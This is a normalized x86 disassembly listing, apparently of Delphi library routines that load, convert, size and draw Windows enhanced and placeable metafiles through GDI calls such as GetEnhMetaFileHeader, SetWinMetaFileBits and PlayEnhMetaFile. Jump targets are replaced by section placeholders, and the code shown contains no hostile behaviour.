pop ebx
retn
mov eax esi
call sub_403604
sub_41f488
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_413918
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41f4cc
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_413918
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f4f0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
mov edx ebx
mov eax [ esi + 0x8 ]
call sub_413a74
cmp di ax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_413a74
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_41f56c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
call sub_41f52c
call sub_41f54c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_41f5ac
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414004
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_41f5dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4031d8
mov edx eax
mov eax [ ebx + 0xc ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414114
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_41f610
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_40341c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403290
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_4034a4
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_4034a4
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40348c
sub_41f68c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_41f71c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_403290
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_4031d8
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4034a4
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4034a4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f73c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ rw-data ]
call sub_41f4f0
mov esi eax
test esi esi
jne r-xdata
mov dl 0x1
mov eax esi
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41f7b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4034a4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
call sub_41da40
mov eax [ ebx + 0xc ]
call sub_403290
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_4034a4
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40348c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_41f800
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi eax
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x60 ]
sub_41f874
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_41f68c
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_41f68c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_414030
mov edx ebx
mov eax esi
call sub_41f68c
jmp r-xdata
pop esi
pop ebx
retn
sub_41f8d0
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41f8f4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41f91c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41fa23
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_404244
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_41f2ec
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_403290
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f9a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa2a
lea eax [ ebp - 0x48 ]
call sub_403fe0
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4034a4
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4034a4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_41f9aa
mov eax [ ebp - 0x4 ]
call sub_403290
call sub_403a44
call sub_403a98
mov eax [ ebx + 0xc ]
call sub_403290
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa2a
lea eax [ ebp - 0x48 ]
call sub_403fe0
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4034a4
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4034a4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_41fa34
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_4031e0
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402b9c
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_41fa90
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_41fb0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41f91c
mov eax [ ebp - 0x8 ]
push eax
push sub_41fa34
push ebp
call sub_41fa90
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41fb88
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_41b998
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_41fbc8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41ecf8
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_41fc10
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_420be8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414004
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_41fc40
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_420be8
mov edx esi
mov eax ebx
call sub_414030
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_420be4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_41fcd4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_41d780
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_41d780
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_41d780
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_41d780
push eax
call SelectPalette
sub_41fd6c
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_41ff14
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call sub_406118
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call sub_406118
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_41fdd0
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41b998
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_41fe5c
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_41ff14
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call sub_406118
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call sub_406118
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_41fec0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42043c
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_4156cc
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_420078
mov edx esi
mov eax ebx
call sub_41ffa8
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_41ff14
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_420be8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_420be4
pop esi
pop ebx
retn
sub_41ff3c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_42043c
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_420078
mov edx esi
mov eax ebx
call sub_41ffa8
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_41ffa8
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_41ff14
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_4158f8
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_4026bc
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_420068
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_4028b8
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_4158f8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_41da70
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42006f
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4026dc
retn
call sub_41da70
sub_420078
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_41ff14
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_41da70
lea eax [ ebp - 0x22 ]
call sub_41e8c0
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call sub_406118
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call sub_406118
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_4026bc
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_4201e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_41da70
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4201ee
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4026dc
retn
call sub_41da70
sub_4201f8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42029f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_42027d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_408450
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c12c
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043ec
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41efc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420284
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_4202d8
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_41ff14
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call sub_406118
mov edx eax
mov eax ebx
call sub_42034c
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call sub_406118
mov edx eax
mov eax ebx
call sub_42034c
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_42034c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_41ff14
pop esi
pop ebx
retn
mov eax ebx
call sub_42049c
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420388
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_41ff14
pop esi
pop ebx
retn
mov eax ebx
call sub_42049c
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4203c8
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_41ff14
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call sub_406118
mov edx eax
mov eax ebx
call sub_420388
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call sub_406118
mov edx eax
mov eax ebx
call sub_420388
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_42043c
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_4156cc
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_42049c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_41ff14
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_420be8
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_420be4
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_420520
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
